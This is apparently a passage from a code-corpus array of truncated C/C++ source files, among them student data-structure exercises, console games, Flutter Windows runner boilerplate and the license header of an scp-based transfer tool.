i >= loc; i--)   \r\n        {\r\n            arr[i + 1] = arr[i];\r\n        }\r\n        arr[loc] = value;\r\n        ub++;\r\n\r\n        printf(\"Array elements are:\\n\");\r\n        for (int i = lb; i <= ub; i++) \r\n        {\r\n            printf(\"%d\\n\", arr[i]);\r\n        }\r\n    }\r\n}\r\n\r\nvoid Deletion_at_begin() \r\n{\r\n  if(ub<lb)\r\n  {\r\n  \tprintf(\"Array is empty\\n\");\r\n  }\r\n  else\r\n  {\r\n    lb++;\r\n  }\r\n    printf(\"Array after deletion:\\n\");\r\n    for (int i = lb; i <= ub; i++) \r\n    {\r\n        printf(\"%d\\n\", arr[i]);\r\n    }\r\n}\r\n\r\nvoid Deletion_at_end()\r\n{\r\n   if(ub<lb)\r\n  {\r\n    printf(\"Array is empty\\n\");\r\n  } \r\n  else\r\n  {\r\n\tub--;\r\n\tprintf(\"Array after deletion:\\n\");\r\n   for (int i = lb; i <= ub; i++) \r\n    {\r\n       printf(\"%d\\n\", arr[i]);\r\n    }\r\n  }\r\n  printf(\"\\n\");\r\n}\r\n\r\nvoid Deletion_at_loc()\r\n{\r\n    if (ub < lb)\r\n    {\r\n        printf(\"Array is empty\\n\");\r\n    }\r\n    else\r\n    {\r\n        int loc;\r\n        printf(\"Enter the location where to delete element: \");\r\n        scanf(\"%d\", &loc);\r\n        if (loc < lb || loc > ub)\r\n        {\r\n            printf(\"Invalid location\\n\");\r\n        }\r\n        else\r\n        {\r\n            for (int i = loc; i < ub; i++)\r\n            {\r\n                arr[i] = arr[i + 1];\r\n            }\r\n            ub--;\r\n            printf(\"Array after deletion:\\n\");\r\n            for (int i = lb; i <= ub; i",
    "/********************************************************************************\n$Id: hscp.cpp 102 2010-12-26 13:47:53Z bunpojpn $\n\nhscp.cpp v 0.9.20 2010-12-25\nCopyright (c) 2009,2010 RCCS technical team of IMS,\n   Fumiyasu Mizutani,\n   Fumitsuna Teshima, Masataka Sawa,\n   Shigeki Naitoh,    Jun-ichi Matsuo,\n   Kensuke Iwahashi,  Takakazu Nagaya.\nAll rights reserved.\nWe special thanks to\n   Hironori Kogawa (Hitachi, Ltd., for the first try to merge UDT into scp),\n   UDT distributer (the board of trustees of the University of Illinois),\n   OpenSSH distributers, and other open source distributers.\n\nRedistribution and use in source and binary forms, with or without modification,\nare permitted provided that the following conditions are met:\n\n  * Redistributions of source code must retain the above copyright notice, this list of\n    conditions and the following disclaimer.\n  * Redistributions in binary form must reproduce the above copyright notice,\n    this list of conditions and the following disclaimer in the documentation and/or\n    other materials provided with the distribution.\n  * Neither the name of the \"NINS (National Institutes of Natural Sciences),\n    IMS (Institute for Molecular Science)\" nor the names of its contributors may be\n    used to endorse or promote products derived from this software without specific\n    prior written permission.\n\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY\nEXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\nMERCHANT ABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL\nTHE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,\nSPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,\nPROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS\nINTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,\nSTRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF\nTHE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n*********************************************************************************/\n/* Original copyrights of scp.c is under this line,                             */\n/********************************************************************************/\n/* $OpenBSD: scp.c,v 1.165 2009/12/20 07:28:36 guenther Exp $ */\n/*\n * scp - secure remote copy.  This is basically patched BSD rcp which\n * uses ssh to do the data transfer (instead of using rcmd).\n *\n * NOTE: This version should NOT be suid root.  (This uses ssh to\n * do the transfer and ssh has the necessary privileges.)\n *\n * 1995 Timo Rinne <tri@iki.fi>, Tatu Ylonen <ylo@cs.hut.fi>\n *\n * As far as I am concerned, the code I have written for this software\n * can be used freely for any purpose.  Any derived versions of this\n * software must be clearly marked as such, and if the derived work is\n * incompatible with the protocol description in the RFC file, it must be\n * called by a name other than \"ssh\" or \"Secure Shell\".\n */\n/*\n * Copyright (c) 1999 Theo de Raadt.  All rights reserved.\n * Copyright (c) 1999 Aaron Campbell.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *    notice, this list of conditions and the following disclaimer in the\n *    documentation and/or other materials provided with the distribution.\n *\n * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR\n * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES\n * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.\n * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,\n * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT\n * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,\n * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY\n * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\n * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF\n * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n/*\n * Parts from:\n *\n * Copyright (c) 1983, 1990, 1992, 1993, 1995\n *\tThe Regents of the University of California.  All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions\n * are met:\n * 1. Redistributions of source code must retain the above copyright\n *    notice, this list of conditions and the following disclaimer.\n * 2. Redistributions in binary form must reproduce the above copyright\n *   ",
    "#include \"Mapa.h\"\r\n#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <windows.h>\r\n\r\nvoid initializeBoard(Symbols symbols, char board[NUM_ROWS][NUM_COLUMNS], Mapa mapa)\r\n{\r\n    for (int i = 0; i < NUM_ROWS; ++i)\r\n    {\r\n        for (int j = 0; j < NUM_COLUMNS; ++j)\r\n        {\r\n            if (i == 0 || i == NUM_ROWS-1 || j == 0 || j == NUM_COLUMNS - 1)\r\n            {\r\n                board[i][j] = symbols.pared;\r\n            }\r\n            else\r\n            board[i][j] = symbols.empty;\r\n        }\r\n        \r\n    }\r\n    \r\n    int maxPokemon = 10;\r\n\r\n    int pokemonPlaced = 0;\r\n\r\n    while (pokemonPlaced < maxPokemon)\r\n    {\r\n        int row = rand() % NUM_ROWS;\r\n        int column = rand() % NUM_COLUMNS;\r\n        if (board[row][column] == symbols.empty)\r\n        {\r\n            board[row][column] = symbols.pokemon;\r\n            pokemonPlaced++;\r\n        }\r\n    }\r\n    \r\n    //Per posar les parets\r\n    /*\r\n    for (int i = 0; i < 2; ++i)\r\n    {\r\n        for (int j = 0; j = 2; ++j)\r\n        {\r\n\r\n        }\r\n    }\r\n    */\r\n\r\n}\r\n\r\nfloat* Read()\r\n{\r\n    int numRowsArray = 3;\r\n    int numColsArray = 2;\r\n    int valor;\r\n\r\n    float** myArray2D;\r\n    myArray2D = new float* [numRowsArray];\r\n    for (int i = 0; i < numRowsArray; ++i) {\r\n        myArray2D[i] = new float[numColsArray];\r\n    }\r\n\r\n    // Abrir el archivo\r\n    std::ifstream archivo(\"config.txt\");\r\n    if (!archivo.is_open()) {\r\n        std::cout << \"No se pudo abrir el archivo.\" << std::endl;\r\n        //return 1;\r\n    }\r\n\r\n\r\n\r\n    for (int i = 0; i < numRowsArray; ++i) {\r\n        for (int j = 0; j < numColsArray; ++j) {\r\n            char coma;\r\n            archivo >> valor >> coma; // Leemos el valor y la coma\r\n            myArray2D[i][j] = valor;\r\n        }\r\n    }\r\n    archivo.close();\r\n\r\n    //return *myArray2D;\r\n\r\n\r\n    std::cout << \"Array:\" << std::endl;\r\n    for (int i = 0; i < numRowsArray; ++i) {\r\n        for (int j = 0; j < numColsArray; ++j) {\r\n            std::cout << myArray2D[i][j] << \" \";\r\n        }\r\n        std::cout << std::endl;\r\n    }\r\n\r\n    // Liberar la memoria\r\n    for (int i = 0; i < numRowsArray; ++i) {\r\n        delete[] myArray2D[i];\r\n    }\r\n    delete[] myArray2D;\r\n\r\n    return 0;\r\n}\r\n\r\n\r\nvoid printBoard(Symbols symbols, char board[NUM_ROWS][NUM_COLUMNS], Mapa mapa)\r\n{\r\n    mapa.row;\r\n    mapa.col;\r\n    int posPlayerX = 2;\r\n    int posPlayerY = 2;\r\n    for (int i = mapa.row; i < NUM_ROWS_PRINT + mapa.row; ++i)\r\n    {\r\n        for (int j = mapa.col; j < NUM_COLUMNS_PRINT + mapa.col; ++j)\r\n        {\r\n            if (i == posPlayerX && j == posPlayerY)\r\n            {\r\n                std::cout << symbols.p_arriva << \" \";\r\n            }\r\n            else {\r\n                switch (board[i][j])\r\n                {\r\n                case 'X':\r\n                    std::cout << symbols.pared << \" \";\r\n                    break;\r\n                case '-':\r\n                    std::cout << symbols.empty << \" \";\r\n                    break;\r\n                case 'P':\r\n                    std::cout << symbols.pokemon << \" \";\r\n                    break;\r\n                default:\r\n                    std::cout << symbols.empty << \" \";\r\n                    break;\r\n                }\r\n            }\r\n                \r\n        }\r\n        std::cout << std::endl;\r\n    }\r\n}\r\n\r\n\r\nbool pokemon(int currentRow, int currentColumn, Symbols symbols, char board[NUM_ROWS][NUM_COLUMNS])\r\n{\r\n    int nextRow = currentRow;\r\n    int nextColumn = currentColumn;\r\n\r\n    if (nextRow >= 0 && nextRow < NUM_ROWS && nextColumn >= 0 && nextColumn < NUM_COLUMNS)\r\n    {\r\n        return (board[nextRow][nextColumn] == symbols.pokemon);\r\n    }\r\n    \r\n    return false;\r\n}\r\n\r\n\r\n\r\nvoid actualizarBoard(Symbols symbols, char board[NUM_ROWS][NUM_COLUMNS], Mapa mapa) {\r\n    char num;\r\n    std::cin >> num;\r\n    if (num == 'd')\r\n    {\r\n        mapa.row++;\r\n        std::system(\"cls\");\r\n        printBoard(symbols, board, mapa);\r\n        std::cout << \"si\";\r\n    }\r\n    /*\r\n    while (true) {\r\n        if (GetAsyncKeyState(VK_UP)) {\r\n            //Tecla presionada\r\n            mapa.row++;\r\n            std::system(\"cls\");\r\n            printBoard(symbols, board, mapa);\r\n        }\r\n        Sleep(100);\r\n        if (GetAsyncKeyState(VK_DOWN)) {\r\n            //Tecla presionada\r\n            mapa.row++;\r\n            std::system(\"cls\");\r\n            printBoard(symbols, board, mapa);\r\n        }\r\n        Sleep(100);\r\n        if (GetAsyncKeyState(VK_LEFT)) {\r\n            //Tecla presionada\r\n            mapa.row++;\r\n            std::system(\"cls\");\r\n            printBoard(symbols, board, mapa);\r\n        }\r\n        Sleep(100);\r\n        if (GetAsyncKeyState(VK_RIGHT)) {\r\n            //Tecla presionada\r\n            mapa.row++;\r\n            std::system(\"cls\");\r\n            printBoard(symbols, board, mapa);\r\n        }\r\n        Sleep(100);\r\n        if (GetAsyncKeyState(VK_SPACE)) {\r\n            //Tecla presionada\r\n\r\n        }\r\n        Sleep(100);\r\n        if (GetAsyncKeyState(VK_ESCAPE)) {\r\n            //T",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"travel_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <stack>\n#include <string>\n\nbool StatementBalancedCheck(std::string statement) {\n    std::stack<char> ParenthesesCheck;\n\n    for (char parentheses : statement) {\n        if (parentheses == '(') {\n        // If an open parentheses is found, place it in the stack\n            ParenthesesCheck.push(parentheses);\n        }\n        else if (parentheses == ')') {\n            if (ParenthesesCheck.empty()) {\n                return false;\n        // If a close parentheses is found without an open parentheses in the stack, return that the statement is not balanced.\n            }\n            ParenthesesCheck.pop();\n        // If a close parentheses is found with an open parentheses in the stack, pop the open parentheses from the stack.\n        }\n    }\n    return ParenthesesCheck.empty();\n}\n\nint main() {\n    std::string statement;\n    std::cout << \"Enter a statement to balance: \";\n    std::cin >> statement;\n\n    //Requests a string to check for balanced parentheses.\n\n    if (StatementBalancedCheck(statement)) { // Checks if the provided sentence/string has a balanced amount of parentheses, then returns an output if it is or is not.\n        std::cout << \"Statement is balanced\\n\";\n    }\n    else {\n        std::cout << \"Statement is not balanced\\n\";\n    }\n}",
    "#include <iostream>\n#include <string>\nusing namespace std; \n\nstruct Node\n{\n\tint noMhs; \n\tstring name; \n\tNode* next; \n\tNode* prev; \n};\n\nNode *START = NULL;\n\nvoid addNode() {\n\tNode* newNode = new Node();  // step 1: create a new node \n\tcout << \"\\nEnter the roll number of the student: \";\n\tcin >> newNode->noMhs;  // Assign value to the data field of the new node \n\tcout << \"\\nEnter the name of the student: \";\n\tcin >> newNode->name;  //Assign value to the data field of the new node \n\n\n\t// Insert the new node in the list \n\tif (START == NULL || newNode->noMhs <= START->noMhs) { // step 2: insert the new node \n\n\t\tif (START != NULL && newNode->noMhs == START->noMhs) {\n\t\t\tcout << \"\\033[31Dumplicate roll numbers not allowed\\033[0m\" << endl;\n\t\t\treturn;\n\t\t}\n\t\t// if the list is empty, make the new node the START \n\t\tnewNode->next = START;  // step 3: make the new node point to the first node \n\t\tif (START != NULL) {\n\t\t\tSTART->prev = newNode; \t// STEP 4: make the first node point to the new node \n\n\t\t}\n\t\tnewNode->prev = NULL;\t// step 5: make the new node point to NULL\n\t\tSTART = newNode;\t\t// step 6: make the new node the first node \n\t}\n\telse {\n\t\t// insert the new node in the middle or at the end \n\t\tNode* current = START;  // step 1.a: start from the first node \n\t\tNode* previous = NULL;  // step 1.b: previous node is NULL initially \n\n\t\twhile (current != NULL && current->noMhs < newNode->noMhs) { // step 1.c: traverse \n\t\t\tprevious = current; // step 1.d: move the previous to the current node \n\t\t\tcurrent = current->next;  // step 1>e: move the current to the next node \n\t\t}\n\n\t\tnewNode->next = current; // step 4. Make the next field of the new node point\n\t\tnewNode->prev = previous; // step 5. make the previous field of the new node point \n\n\t\tif (current != NULL) {\n\t\t\tcurrent->prev = newNode; //step 6. Make the previous field of the current new node \n\t\t}\n\n\t\tif (previous != NULL) {\n\t\t\tprevious->next = newNode; // step 7. Make the next field of the previous node \n\t\t}\n\t\telse {\n\t\t\t// if previous is still NULL, it means newNode is now the first node \n\t\t\tSTART = newNode;\n\t\t}\n\t}\n}\nbool search(int rollNo, Node **previous, Node **current)\n{\n\t*previous = NULL;\n\t*current = START;\n\twhile (*current != NULL && (*current)->noMhs != rollNo)\n\t{\n\t\t*previous = *current;\n\t\t*current = (*current)->next;\n\t}\n\treturn (*current != NULL);\n}\n\nvoid deleteNode()\n{\n\tNode* previous, * current; // \n\tint rollNo;\n\n\tcout << \"\\nEnter the roll number of the student whose record is to be deleted: \";\n\tcin >> rollNo; // step 3: get the roll number to be deleted \n\n\tif (START == NULL)\n\t{\n\t\tcout << \"List is empty\" << endl;\n\t\treturn;\n\t}\n\n\tcurrent = START; // Step 1: start from the first node \n\tprevious = NULL;\n\n\t// Locate the node to be deleted \n\twhile (current != NULL && current->noMhs != rollNo)\n\t{\n\t\tprevious = current;\n\t\tcurrent = current->next;\n\t}\n\n\tif (current == NULL)\n\t{\n\t\tcout << \"\\033[31mthe record with roll number \" << rollNo << \" not found\\033[0m\" << endl;\n\t\treturn;\n\t}\n\n\t// Node to be deleted is the first node \n\tif (current == START)\n\t{\n\t\tSTART = START->next; //step 2: update the START pointer\n\t\tif (START != NULL)\n\t\t{\t\t\t\t\t\t//\n\t\t\tSTART->prev = NULL; // step \n\t\t}\n\t}\n\telse\n\t{ // Node to be deleted is not the first node \n\t\tprevious->next = current->prev;\n\t\tif (current->next != NULL)\n\t\t{ // If there's a successor, update its prev pointer \n\t\t\tcurrent->next->prev = previous;\n\t\t}\n\t}\n\n\t// Release the memory of the node marked as current \n\tdelete current;\n\tcout << \"\\x1b[32mRecord with roll number \" << rollNo << \" deleted\\x1b[0m\" << endl;\n}\n\nbool listEmpty()\n{\n\treturn (START == NULL);\n}\nvoid traverse()\n{\n\tif (listEmpty())\n\t\tcout << \"\\nList is empty\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecords in asceding order of roll number are:\" << endl;\n\t\tNode* currentNode = START;  //step 1 \n\t\twhile (currentNode != NULL)\t//step 2\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl; //step 3\n\t\t\tcurrentNode = currentNode->next;\t\t\t\t\t\t\t\t// step 4\n\t\t}\n\t}\n}\nvoid revtraverse()\n{\n\n\tif (listEmpty())\n\t\tcout << \"\\nRecords in descending order of roll number are:\" << endl;\n\telse\n\t{\n\t\tcout << \"\\nRecords im descending order of roll number are:\" << endl;\n\t\tNode* currentNode = START;\n\t\twhile (currentNode->next != NULL)\n\t\t\tcurrentNode = currentNode->next;\n\t\twhile (currentNode != NULL)\n\t\t{\n\t\t\tcout << currentNode->noMhs << \" \" << currentNode->name << endl;\n\t\t\tcurrentNode = currentNode->prev;\n\t\t}\n\n\t}\n}\n\nvoid searchData()\n{\n\tif (listEmpty() == true)\n\t{\n\t\tcout << \"\\nList is empty\" << endl;\n\t}\n\tNode* prev, *curr; \n\tprev = curr = NULL; \n\tcout << \"\\nEnter the roll number of the student whose record you want to seacrh: \"; \n\tint num; \n\tcin >> num; \n\tif (search(num, &prev, &curr) == false)\n\t\tcout << \"\\nRecord not found\" << endl; \n\telse\n\t{\n\t\tcout << \"\\nRecord found\" << endl; \n\t\tcout << \"\\nRoll number: \" << curr->noMhs << endl; \n\t\tcout << \"\\nName: \" << curr->name << endl; \n\t}\n}\nint main()\n{\n\twhile (true)\n\t{\n\t\ttry\n\t\t{\n\t\t\tcout << \"\\nMenu\" << endl;\n\t\t\tcout << \"1. Add a record to the list\" << endl;\n\t\t\tcout << \"",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <time.h>\r\n\r\nusing namespace std;\r\n\r\nint karta()\r\n{\r\n\treturn rand() % 52 + 2;\r\n}\r\n\r\nbool czywylosowana(int tab[], int liczba, int dl)\r\n{\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\tif (tab[i] == liczba)\r\n\t\t\treturn true;\r\n\t\ti++;\r\n\t} while (i < dl + 1);\r\n\treturn false;\r\n}\r\n\r\nvoid poczatek(int z[], int g[], int dl, int ilosc)\r\n{\r\n\tint s = 0;\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\ts = karta();\r\n\t\tif (czywylosowana(z, s, dl) == false)\r\n\t\t{\r\n\t\t\tg[i] = s;\r\n\t\t\ti++;\r\n\t\t\tdl++;\r\n\t\t\tz[dl] = s;\r\n\t\t}\r\n\r\n\t} while (i < ilosc);\r\n}\r\n\r\nint kartapoczatkowa()\r\n{\r\n\tint s = 0;\r\n\ts = karta();\r\n\treturn s;\r\n}\r\n\r\nstring zamiana(int l)\r\n{\r\n\tstring figura = \" \";\r\n\tint dwa = l - 2;\r\n\tint trzy = l - 3;\r\n\tint piec = l - 5;\r\n\tif (dwa % 4 == 0 or dwa == 0)\r\n\t\tfigura = \"pik\";\r\n\tif (l % 4 == 0)\r\n\t\tfigura = \"karo\";\r\n\tif (trzy % 4 == 0 or trzy == 0)\r\n\t\tfigura = \"kier\";\r\n\tif (piec % 4 == 0 or piec == 0)\r\n\t\tfigura = \"trefl\";\r\n\treturn figura;\r\n}\r\n\r\nint zamiana2(int l, string z)\r\n{\r\n\tif (z == \"pik\")\r\n\t\tl = ((l - 2) / 4) + 2;\r\n\tif (z == \"kier\")\r\n\t\tl = ((l - 3) / 4) + 2;\r\n\tif (z == \"karo\")\r\n\t\tl = ((l - 4) / 4) + 2;\r\n\tif (z == \"trefl\")\r\n\t\tl = ((l - 5) / 4) + 2;\r\n\treturn l;\r\n}\r\n\r\nvoid runda(int tab[], int ilekart, string ksf, int ksc)\r\n{\r\n\tstring figura;\r\n\tint cyfra;\r\n\tfor (int i = 0; i < ilekart; i++)\r\n\t{\r\n\t\tcout << i + 1; cout << \". \";\r\n\t\tfigura = zamiana(tab[i]);\r\n\t\tcout << figura;\r\n\t\tcout << \" \";\r\n\t\tcyfra = zamiana2(tab[i], figura);\r\n\t\tif (cyfra == 11)\r\n\t\t\tcout << \"jopek\";\r\n\t\telse if (cyfra == 12)\r\n\t\t\tcout << \"dama\";\r\n\t\telse if (cyfra == 13)\r\n\t\t\tcout << \"krol\";\r\n\t\telse if (cyfra == 14)\r\n\t\t\tcout << \"as\";\r\n\t\telse\r\n\t\t\tcout << cyfra;\r\n\t\tif (figura == ksf or cyfra == ksc or cyfra == 12 or ksc == 12)\r\n\t\t\tcout << \" mozna zagrac\";\r\n\t\tcout << endl;\r\n\t}\r\n}\r\n\r\nvoid kns(string knf, int knc)\r\n{\r\n\tstring figura;\r\n\tint cyfra;\r\n\tfigura = knf;\r\n\tcout << figura;\r\n\tcout << \" \";\r\n\tcyfra = knc;\r\n\tif (cyfra == 11)\r\n\t\tcout << \"jopek\";\r\n\telse if (cyfra == 12)\r\n\t\tcout << \"dama\";\r\n\telse if (cyfra == 13)\r\n\t\tcout << \"krol\";\r\n\telse if (cyfra == 14)\r\n\t\tcout << \"as\";\r\n\telse\r\n\t\tcout << cyfra;\r\n}\r\n\r\nvoid draw(int z[], int g[], int dl, int ile, int iledobrac)\r\n{\r\n\tint s = 0;\r\n\tint i = 0;\r\n\tdo\r\n\t{\r\n\t\ts = karta();\r\n\t\tif (czywylosowana(z, s, dl) == false)\r\n\t\t{\r\n\t\t\tg[ile] = s;\r\n\t\t\ti++;\r\n\t\t\tz[dl] = s;\r\n\t\t}\r\n\r\n\t} while (i < iledobrac);\r\n}\r\n\r\n\r\nvoid play(int tab[], int k, string kf, int kc, int ilekartwrence)\r\n{\r\n\tbool y = false;\r\n\tdo\r\n\t{\r\n\t\tif (zamiana(tab[k]) == kf or zamiana2(tab[k], zamiana(tab[k])) == kc or zamiana2(tab[k], zamiana(tab[k])) == 12 or kc == 12)\r\n\t\t{\r\n\t\t\tkf = zamiana(tab[k]);\r\n\t\t\tkc = zamiana2(tab[k], zamiana(tab[k]));\r\n\t\t\tfor (int i = 0; i < ilekartwrence - 1; i++)\r\n\t\t\t{\r\n\t\t\t\tif (i >= k)\r\n\t\t\t\t{\r\n\t\t\t\t\ttab[i] = tab[i + 1];\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\ty = true;\r\n\t\t}\r\n\t\telse\r\n\t\t\tcout << \"nie mozesz zagrac tej karty\" << endl;\r\n\t} while (y = false);\r\n\r\n}\r\n\r\n\r\nint main()\r\n{\r\n\tint dlugosc = 0;\r\n\tint juzdobrane[52];\r\n\tint iloscgraczy = 0;\r\n\tbool czyokgraczy = false;\r\n\tint koniec = 0;\r\n\tbool makao1 = false; bool makao2 = false; bool makao3 = false; bool makao4 = false;\r\n\tint gracz1[52]; int gracz2[52]; int gracz3[52]; int gracz4[52];\r\n\tint kartanastole; string kartanastolefigura; int kartanastolecyfra;\r\n\tint zastepczacyfra; string zastepczafigura;\r\n\tint ilekartwrence1 = 5; int ilekartwrence2 = 5; int ilekartwrence3 = 5; int ilekartwrence4 = 5;\r\n\tstring dzialaniegracza;\r\n\tint ktorarunda = 1;\r\n\tint karta;\r\n\tsrand(time(NULL));\r\n\r\n\tdo\r\n\t{\r\n\t\tcout << \"podaj ilosc graczy od 2 do 4\" << endl;\r\n\t\tcin >> iloscgraczy;\r\n\t\tif (iloscgraczy == 2 or iloscgraczy == 3 or iloscgraczy == 4)\r\n\t\t{\r\n\t\t\tczyokgraczy = true;\r\n\t\t}\r\n\t} while (czyokgraczy == false);\r\n\tkoniec = iloscgraczy;\r\n\tsystem(\"cls\");\r\n\r\n\tdo\r\n\t{\r\n\t\tkartanastole = kartapoczatkowa();\r\n\t\tkartanastolefigura = zamiana(kartanastole);\r\n\t\tkartanastolecyfra = zamiana2(kartanastole, kartanastolefigura);\r\n\t} while (kartanastolecyfra > 10);\r\n\tjuzdobrane[0] = kartanastole;\r\n\r\n\tpoczatek(juzdobrane, gracz1, dlugosc, ilekartwrence1);\r\n\tdlugosc += 5;\r\n\tpoczatek(juzdobrane, gracz2, dlugosc, ilekartwrence2);\r\n\tdlugosc += 5;\r\n\tif (iloscgraczy == 3 